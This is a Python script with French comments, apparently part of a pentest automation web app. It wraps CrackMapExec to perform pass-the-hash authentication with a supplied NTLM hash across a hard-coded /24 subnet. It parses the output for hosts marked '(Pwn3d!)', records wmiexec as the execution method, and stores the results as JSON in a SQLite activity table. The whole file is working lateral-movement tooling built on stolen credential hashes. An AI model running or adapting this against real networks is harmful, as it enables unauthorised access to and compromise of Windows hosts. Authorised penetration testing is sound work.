#importer les bibliothèques
import subprocess
import time
import argparse
import json
import sqlite3
from datetime import datetime
import re


#Les arguments :
parser = argparse.ArgumentParser()

parser.add_argument('--activity_id', type=str, required=True, help='activity id')
parser.add_argument('--ntlm_hash', type=str, required=True, help='La hash NTLM')
parser.add_argument('--username', type=str, required=False, help='Le Username')
parser.add_argument('--domain_name', type=str, required=False, help='Le nom de domaine')

args = parser.parse_args()
ip = '192.168.80.0/24'
hash_ntlm = args.ntlm_hash
username = args.username
domaine_name = args.domain_name


if domaine_name == '':
	command = "crackmapexec smb " + ip + " -u " + username + " -H " + hash_ntlm + " --local-auth"
	print(command)
else:
	command = "crackmapexec smb " + ip + " -u " + username + " -H " + hash_ntlm + " -d " + domaine_name
	print(command)


# Exécute la commande dans un nouveau processus
process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)

# Attend que la tâche soit terminée et récupère la sortie
output, error = process.communicate()

print("%%---------affichage de la sortie : -----------%%")
print(output.decode("utf-8"))

list_succes = []
ansi_escape = re.compile(r'\x1b\[[0-9;]*m')
ansi_escape1 = re.compile(r'[ ]+')
for ligne_succes in output.decode('utf-8').split('\n'):
	if ligne_succes.find('[+]') != -1:
		ligne_succes = ansi_escape.sub('', ligne_succes)
		ligne_succes = ansi_escape1.sub(' ', ligne_succes)
		list_succes.append(ligne_succes)

resultats = {}
hosts_list = []		
for ligne_succes_nettoyer in list_succes:
	resultat = {}
	pwn3d = False
	ip_host = ligne_succes_nettoyer.split(' ')[1]
	host_name = ligne_succes_nettoyer.split(' ')[3]
	if ligne_succes_nettoyer.find('(Pwn3d!)') != -1:
		pwn3d = True
	resultat = {
		'host_ip' : ip_host,
		'host_name' : host_name,
		'Pwn3d' : pwn3d
		
	}
	hosts_list.append(resultat)
	
resultats = {
	'username' : username,
	'hash_ntlm' : hash_ntlm,
	'hosts' : hosts_list,
	'exec_methode' : 'wmiexec'
}		

print(json.dumps(resultats, indent=4))		
		
#transformer le dictionnaire en JSON
json_resultats = json.dumps(resultats)


# obtenir l'id de l'activite sur laquel on va enregistrer le resultat :
activity_id = int(args.activity_id)

# Se connecter a la BDD pour enregistrer le resultat sous format json :
conn = sqlite3.connect("db.sqlite3")
c = conn.cursor()

activities = c.execute("update My_app_activity set results = ? where id = ?", (json_resultats, activity_id))
activities = c.execute("update My_app_activity set end_date = ? where id = ?", (datetime.now(), activity_id))

# commit les changements :
conn.commit()		
